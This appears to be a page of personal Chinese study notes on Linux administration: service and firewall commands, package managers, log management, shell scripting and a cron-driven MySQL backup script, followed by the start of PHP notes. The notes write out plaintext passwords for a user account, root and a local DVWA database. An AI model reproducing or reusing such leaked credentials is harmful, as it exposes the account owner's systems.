<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chkconfig</span><br><span class="line">	给服务在各个运行级别设置自 启动/关闭</span><br><span class="line">	chkconfig 指令管理的服务在/etc/init.d目录查看</span><br><span class="line">	centos7以后很多服务使用systemctl管理</span><br><span class="line">	语法</span><br><span class="line">		chkconfig --list</span><br><span class="line">		chkconfig 服务名 --list</span><br><span class="line">		chkconfig --level [number] 服务名 on/off</span><br><span class="line">	reboot生效</span><br></pre></td></tr></table></figure>

<h4 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">管理指令</span><br><span class="line">	systemctl [start|stop|restart|statue] 服务名</span><br><span class="line">	systemctl指令管理的服务是在/usr/lib/systemd/system目录下查看</span><br><span class="line">		e.g. ll /usr/lib/systemd/system   -&gt;firewalld.service</span><br><span class="line">设置服务自启动和状态</span><br><span class="line">	systemctl list-uint-files 		查看所有服务的自启动状态</span><br><span class="line">	systemctl enable [服务名]		  设置服务开机启动</span><br><span class="line">	systemctl disable [服务名]		  关闭...</span><br><span class="line">	systemctl is-enabled [服务名]    查询某个服务是否自启动</span><br><span class="line">	</span><br><span class="line">	systemctl status firewalld</span><br></pre></td></tr></table></figure>

<h4 id="firewall"><a href="#firewall" class="headerlink" title="firewall"></a>firewall</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">打开端口</span><br><span class="line">	firewall-cmd --permanent --add-port=[端口号]/[协议]</span><br><span class="line">关闭端口</span><br><span class="line">	firewall-cmd --permanent --remove-port=[端口号]/[协议号]</span><br><span class="line">重新载入才能生效</span><br><span class="line">	firewall-cmd --reload</span><br><span class="line">查询端口是否开放</span><br><span class="line">	firewall-cmd --query-port=[端口]/[协议号]			？？</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在windows cmd使用telnet检测</span><br><span class="line">	telnet 192.168.213.135 111</span><br><span class="line">	先开放端口然后重新载入然后就可以telnet了</span><br></pre></td></tr></table></figure>

<h3 id="p78-动态监控"><a href="#p78-动态监控" class="headerlink" title="p78 动态监控"></a>p78 动态监控</h3><h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">与ps类似，top在执行一段时间可以更新正在运行的进程</span><br><span class="line">参数</span><br><span class="line">	-d 默认3秒</span><br><span class="line">	-i 不显示任何闲置或者僵死进程</span><br><span class="line">	-p 通过监控进程ID来仅仅监控某个进程的状态</span><br><span class="line">前5行</span><br><span class="line">	https://www.cnblogs.com/kaibindirver/p/14960098.html</span><br><span class="line">top中的交互</span><br><span class="line">	P	cpu使用率排序 默认此项</span><br><span class="line">	M 	内存使用率排序</span><br><span class="line">	N 	PID排序</span><br><span class="line">	q	退出</span><br><span class="line">	u	输入用户</span><br><span class="line">	k	删除进程</span><br></pre></td></tr></table></figure>

<h4 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看系统网络情况</span><br><span class="line">	参数</span><br><span class="line">		-an	按一定顺序输出</span><br><span class="line">		-p	显示哪个进程在调用</span><br><span class="line">	netstat -an | more</span><br><span class="line">	此处开了5个终端，foreign address监听192.168.213.1的5个端口</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665469768306.png" alt="1665469768306"></p>
<h3 id="p82-rpm包的管理"><a href="#p82-rpm包的管理" class="headerlink" title="p82 rpm包的管理"></a>p82 rpm包的管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">rpm用于互联网下载的打包及安装工具，它包含于某些linux分发版。它生成.RPM扩展名文件。RPM是RedHat Package Manager缩写。类似windows的setup.</span><br><span class="line">简单查询指令		-q</span><br><span class="line">	rpm -qa				显示全部</span><br><span class="line">	rpm -q firefox		查询火狐装了没</span><br><span class="line">	rpm -qi firefox		查询火狐软件包信息</span><br><span class="line">	rpm -ql firefox		查询火狐软件包中的文件</span><br><span class="line">	rpm -qf	/etc/passwd 查文件所属软件包	查出来是setup这个包</span><br><span class="line">基本格式</span><br><span class="line">	firefox-68.10.0-1.el7.centos.x86_64</span><br><span class="line">	版本号			  68.10.0-1</span><br><span class="line">	适用操作系统		el7.centos.x86_64</span><br><span class="line">		el			enterprise linux缩写</span><br><span class="line">		7			内核</span><br><span class="line">		x86_64		64位</span><br><span class="line">		i686、i386	32位</span><br><span class="line">		noarch		表示通用</span><br><span class="line">卸载</span><br><span class="line">	rpm -e [包名 不必全名]		//erase</span><br><span class="line">	可能导致依赖问题	--nodeps强制删除</span><br><span class="line">安装</span><br><span class="line">	rpm -ivh [RPM包全路径]</span><br><span class="line">		-i install</span><br><span class="line">		-v verbose	提示</span><br><span class="line">		-h hash		进度条</span><br></pre></td></tr></table></figure>

<h3 id="p84-yum"><a href="#p84-yum" class="headerlink" title="p84 yum"></a>p84 yum</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shell前端软件包管理器，基于rpm管理，能够从指定服务器自动下载RPM包并安装，可以自主处理依赖关系，并一次性安装所有依赖的软件包</span><br><span class="line">yum list | more			软件列表</span><br><span class="line">yum install xxx</span><br></pre></td></tr></table></figure>

<h2 id="p86-89-关于JDK8-tomcat8-idea2020-mysql5-7安装没看"><a href="#p86-89-关于JDK8-tomcat8-idea2020-mysql5-7安装没看" class="headerlink" title="p86-89 关于JDK8 tomcat8 idea2020 mysql5.7安装没看"></a>p86-89 关于JDK8 tomcat8 idea2020 mysql5.7安装没看</h2><h3 id="p110-ubuntu"><a href="#p110-ubuntu" class="headerlink" title="p110_ubuntu"></a>p110_ubuntu</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安装虚拟机随便点点 2204</span><br><span class="line">sudo passwd设定root密码</span><br><span class="line"></span><br><span class="line">apt是Advanced Packaging Tool简称</span><br><span class="line">/etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665846687243.png" alt="1665846687243"></p>
<h3 id="p113-APT更新源和实例"><a href="#p113-APT更新源和实例" class="headerlink" title="p113 APT更新源和实例"></a>p113 APT更新源和实例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update				更新源</span><br><span class="line">sudo apt-get upgrade			更新已安装的包</span><br><span class="line">sudo apt-get install package	安装包</span><br><span class="line">sudo apt-get remove package		删除包</span><br><span class="line">sudo apt-get <span class="built_in">source</span> package		下载该包的源代码</span><br><span class="line"></span><br><span class="line">更新镜像源及实例</span><br><span class="line">	将https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/内容整个覆盖/etc/apt/sources.list</span><br><span class="line">	apt-get install vim</span><br><span class="line">	apt-get remove vim</span><br><span class="line">	apt-cache show vim		获取软件信息</span><br></pre></td></tr></table></figure>

<h3 id="p114-远程和集群"><a href="#p114-远程和集群" class="headerlink" title="p114 远程和集群"></a>p114 远程和集群</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh		Secure shell</span><br><span class="line">	是建立在应用层和传输层的安全协议</span><br><span class="line">	ubuntu默认没有安装sshd服务</span><br><span class="line">	netstat需要apt-get install net-tools才能使用</span><br><span class="line">	apt-get install openssh-server</span><br><span class="line">	service sshd restart</span><br><span class="line">	只能用hyy 123登录然后su root 123456Hyy。。。不知道为什么</span><br></pre></td></tr></table></figure>

<h3 id="p117-Linux日志管理和实例"><a href="#p117-Linux日志管理和实例" class="headerlink" title="p117 Linux日志管理和实例"></a>p117 Linux日志管理和实例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">记录许多重要的系统事件，包括登录信息、系统启动信息、系统安全信息、邮件相关信息、各种服务相关信息等</span><br><span class="line">通过日志来检查错误发生的原因或者收到攻击时攻击者留下的痕迹</span><br><span class="line">系统日志文件保存地址</span><br><span class="line">	/var/log</span><br><span class="line">系统常用日志</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665933221199.png" alt="1665933221199"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/secure</span><br></pre></td></tr></table></figure>

<h3 id="p118-rsyslogd"><a href="#p118-rsyslogd" class="headerlink" title="p118 rsyslogd"></a>p118 rsyslogd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Centos6.x	syslogd</span><br><span class="line">Centos7.6	rsyslogd</span><br><span class="line"></span><br><span class="line">/etc/rsyslog.conf管理了日志服务</span><br><span class="line">ps -aux | grep &quot;rsyslog&quot; | grep -v &quot;grep&quot;</span><br><span class="line">	grep -v 反向匹配</span><br><span class="line">systemctl list-uint-files | grep rsyslog</span><br><span class="line">	rsyslogd记录的日志文件，日志文件格式包含以下4列：</span><br><span class="line">		1.事件产生的事件</span><br><span class="line">		2.产生事件的服务器的主机名</span><br><span class="line">		3.产生事件的服务器名或程序名</span><br><span class="line">		4.事件的具体信息</span><br><span class="line">	e.g.	/var/log/secure</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665998306817.png" alt="1665998306817"></p>
<h3 id="p120-自定义日志"><a href="#p120-自定义日志" class="headerlink" title="p120 自定义日志"></a>p120 自定义日志</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># /etc/rsyslog.conf中添加一个日志文件/var/log/hsp.log 当有事件发送时比如(sshd服务相关事件)，该文件会接受到信息并保存</span><br><span class="line">vim /etc/rsyslog.conf		#要往下拉</span><br><span class="line">#       增加自定义的日志		参考别人写的，这个是把所有的都写进去了</span><br><span class="line">*.*		/var/log/hsp.log</span><br><span class="line">reboot	事件就被写进去了</span><br></pre></td></tr></table></figure>

<h3 id="p121日志轮替"><a href="#p121日志轮替" class="headerlink" title="p121日志轮替"></a>p121日志轮替</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把旧的日志文件移动并改名，同时建立新的日志文件，当旧日志文件超出保存的范围之后就会进行删除</span><br></pre></td></tr></table></figure>

 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">日志轮替文件命名</span><br><span class="line">	使用logrotate进行日志轮替管理，通过/etc/logrotate.conf配置dateext参数</span><br><span class="line">		如果有这个参数，日志会使用日期来作为日志文件的后缀，e.g.secure-20221105,名字不会重叠秩序保存日志个数，删除多余的日志文件即可</span><br><span class="line">		若无dateext，即新生成secure，之前的secure--&gt;secure.1</span><br><span class="line">	下面的截图看注释，上面的是全局的设置，每周一次轮替，保存4份文件，日志轮替创建新的文件，使用日期作为日志轮替文件的后缀</span><br><span class="line">		下面是单独的设置，优先级高</span><br><span class="line">	include /etc/logrotate.d表示也可以把规则写到这个目录下</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1667655808332.png" alt="1667655808332"></p>
<h3 id="p122-自定日志轮替"><a href="#p122-自定日志轮替" class="headerlink" title="p122 自定日志轮替"></a>p122 自定日志轮替</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#需求	/var/log/hsp.log</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1667656547568.png" alt="1667656547568"></p>
<h3 id="p123-日志轮替机制"><a href="#p123-日志轮替机制" class="headerlink" title="p123 日志轮替机制"></a>p123 日志轮替机制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">机制	系统定时任务/etc/cron.daily/目录logrotate</span><br></pre></td></tr></table></figure>

<h3 id="p124-内存日志"><a href="#p124-内存日志" class="headerlink" title="p124 内存日志"></a>p124 内存日志</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">journalctl	#查看全部</span><br><span class="line">journalctl -n 3		#查看最新3条</span><br><span class="line">journalctl --since 19:00 --until 19:10:10</span><br><span class="line">journalctl -p err	#查看报错日志</span><br><span class="line">journalctl -o verbose	#日志详细内容</span><br><span class="line">journalctl | grep sshd</span><br><span class="line">journalctl查看的是内存日志，重启清空</span><br></pre></td></tr></table></figure>

<h2 id="Shell-编程"><a href="#Shell-编程" class="headerlink" title="Shell 编程"></a>Shell 编程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">命令行解释器 为用户提供一个向Linux内核发送请求以便运行程序的界面系统级程序用户可以用Shell来启动、挂起、停止、编写一些程序</span><br><span class="line">由内到外依次是硬件-》内核-》Shell-》外层应用程序</span><br><span class="line">脚本以#!/bin/bash开头 		表明使用什么shell</span><br><span class="line">需要可执行权限</span><br><span class="line">两种执行方式		chmod改</span><br><span class="line">	1.先chmod，然后bash hello.sh</span><br><span class="line">	2.sh hello.sh</span><br></pre></td></tr></table></figure>

<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">系统变量		设定好的</span><br><span class="line">	$HOME $SHELL $USER</span><br><span class="line">变量习惯大写，这是规范</span><br><span class="line">set指令查看所有变量</span><br><span class="line">普通变量使用unset删除</span><br><span class="line">echo输出需要加上$</span><br><span class="line">	readonly B=2		#readon定义静态变量，不能unset</span><br><span class="line">vim普通模式下		:nu显示行号</span><br><span class="line">讲命令返回值赋给变量</span><br><span class="line">	A=`date`			#反引号</span><br><span class="line">	B=$(date)			#等价反引号</span><br></pre></td></tr></table></figure>

<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/profile文件最后加上</span><br><span class="line">	export HYY_HOME=/home/hyy19</span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<h4 id="位置参数变量"><a href="#位置参数变量" class="headerlink" title="位置参数变量"></a>位置参数变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">类似python的argparse</span><br><span class="line">	$n	$0表示命令本身	$1-9按顺序 10以上$(10)</span><br><span class="line">	$*	全部</span><br><span class="line">	$@	全部 不过区分对待</span><br><span class="line">	$#	所有参数个数</span><br></pre></td></tr></table></figure>

<h4 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$	当前进程的pid</span><br><span class="line">$!	后台运行最后一个进程的pid</span><br><span class="line">$?	上一个执行命令的返回状态 0 表正确执行 其他数字由命令自己执行</span><br></pre></td></tr></table></figure>

<h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">基本语法</span><br><span class="line">	$((运算式)) 或者 $[运算时] 或者 expr m + n // expression表达式</span><br><span class="line">	expression需要由空格</span><br><span class="line">	expr结果赋予某个变量，使用``		echo `expr 100 + 200`</span><br><span class="line">	expr m - n</span><br><span class="line">	expr \* / %		乘 除 取余		\是转义字符</span><br><span class="line">	e.g.  (2+3)*4</span><br><span class="line">		res1=$(((2+3)*4))</span><br><span class="line">		res2=$[(2+3)*4]</span><br><span class="line">		</span><br><span class="line">		tmp=`expr 2 + 3`</span><br><span class="line">		res4=`expr $tmp \* 4`</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">	[condition]				前后需要空格</span><br><span class="line">	#非空返回true，可使用$?验证（0为true，&gt;1为false）</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665549485878.png" alt="1665549485878"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要空格</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665549751894.png" alt="1665549751894"></p>
<h4 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h4><h5 id="if"><a href="#if" class="headerlink" title="if"></a>if</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if [条件判断式]</span><br><span class="line">then</span><br><span class="line">	代码</span><br><span class="line">elif</span><br><span class="line">then</span><br><span class="line">	代码</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h5 id="case"><a href="#case" class="headerlink" title="case"></a>case</h5><p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665550648907.png" alt="1665550648907"></p>
<h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665551226182.png" alt="1665551226182"></p>
<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665551692016.png" alt="1665551692016"></p>
<h5 id="while"><a href="#while" class="headerlink" title="while"></a>while</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while [条件判断式]</span><br><span class="line">do</span><br><span class="line">	程序</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665552125947.png" alt="1665552125947"></p>
<h4 id="p102-read-读取控制台输入"><a href="#p102-read-读取控制台输入" class="headerlink" title="p102 read 读取控制台输入"></a>p102 read 读取控制台输入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选项</span><br><span class="line">	-p 指定读取时的提示符</span><br><span class="line">	-t 读取等待时间（秒）</span><br><span class="line">参数</span><br><span class="line">	变量名</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665554706206.png" alt="1665554706206"></p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><h5 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">	basename [pathname] [suffix]	显示路径最后的文件名 suffix如果指定会把pathname或string中suffix去掉</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665555023107.png" alt="1665555023107"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirname		返回完整路径最后/的前面的部分，常用于返回路径部分</span><br></pre></td></tr></table></figure>

<h5 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function funname()&#123;</span><br><span class="line">	Action;</span><br><span class="line">	[return int;]</span><br><span class="line">&#125;</span><br><span class="line">调用直接写函数名		funname [值]</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1665555764080.png" alt="1665555764080"></p>
<h3 id="p105-定时备份数据库"><a href="#p105-定时备份数据库" class="headerlink" title="p105 定时备份数据库"></a>p105 定时备份数据库</h3><p>&#x2F;usr&#x2F;sbin&#x2F;p106_back_up.sh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 备份目录</span></span><br><span class="line">BACKUP=/data/backup/db</span><br><span class="line"><span class="comment">#/usr/local/phpstudy/soft/mysql/mysql-5.7.27/data/mysql/help_topic.ibd</span></span><br><span class="line"><span class="comment"># 当前时间</span></span><br><span class="line">DATETIME=$(<span class="built_in">date</span> +%Y-%m-%d_%H%M%S)</span><br><span class="line"><span class="comment">#echo $DATATIME</span></span><br><span class="line"><span class="comment">#数据库地址</span></span><br><span class="line">HOST=localhost</span><br><span class="line"><span class="comment">#数据库用户名		#这个在小皮面板可以找到</span></span><br><span class="line">DB_USER=test3</span><br><span class="line"><span class="comment">#数据库密码</span></span><br><span class="line">DB_PWD=test3</span><br><span class="line"><span class="comment">#备份的数据库名</span></span><br><span class="line">DATABASE=dvwa</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建备份目录，如果不存在，则创建</span></span><br><span class="line"><span class="comment">#左边命令执行才会执行右边命令</span></span><br><span class="line"><span class="comment">#非文件夹 ! -d</span></span><br><span class="line">[ ! -d <span class="string">&quot;<span class="variable">$&#123;BACKUP&#125;</span>/<span class="variable">$DATETIME</span>&quot;</span> ] &amp;&amp; <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$&#123;BACKUP&#125;</span>/<span class="variable">$DATETIME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#备份数据库	mysqldump使用ln -fs 源 /usr/bin（源使用locate mysqldump | grep phpstudy找到）</span></span><br><span class="line">mysqldump -u<span class="variable">$&#123;DB_USER&#125;</span> -p<span class="variable">$&#123;DB_PWD&#125;</span> --host=<span class="variable">$&#123;HOST&#125;</span> -q -R --databases <span class="variable">$&#123;DATABASE&#125;</span> | gzip &gt; <span class="variable">$BACKUP</span>/<span class="variable">$DATETIME</span>/<span class="variable">$DATETIME</span>.sql.gz</span><br><span class="line"><span class="comment">#将文件处理成 tar.gz</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$BACKUP</span></span><br><span class="line">tar -zcvf <span class="variable">$DATETIME</span>.tar.gz <span class="variable">$DATETIME</span></span><br><span class="line"><span class="comment"># 删除被备份的文件</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$BACKUP</span>/<span class="variable">$DATETIME</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除10天前的备份文件</span></span><br><span class="line">find <span class="variable">$BACKUP</span> -atime +10 -name <span class="string">&quot;.tar.gz&quot;</span> -<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;备份数据库完成&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">	30 2 * * * sh /usr/sbin/p106_backup_db.sh	<span class="comment">#每天2点半执行</span></span><br><span class="line">crontab -l		<span class="comment">#查询有哪些定时任务</span></span><br></pre></td></tr></table></figure>



<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><h3 id="1-PHP是什么"><a href="#1-PHP是什么" class="headerlink" title="1.PHP是什么"></a>1.PHP是什么</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hypertext Preprocessor超文本预处理器，一种开源通用服务器端脚本语言</span><br><span class="line">通用：跨平台</span><br><span class="line">开源</span><br><span class="line">免费</span><br><span class="line">服务器端：必须安装在服务器环境下才可以使用</span><br><span class="line">脚本语言：解释性语言，按编写顺序执行，指i不需要编译由解释器或虚拟机直接执行的语言</span><br></pre></td></tr></table></figure>

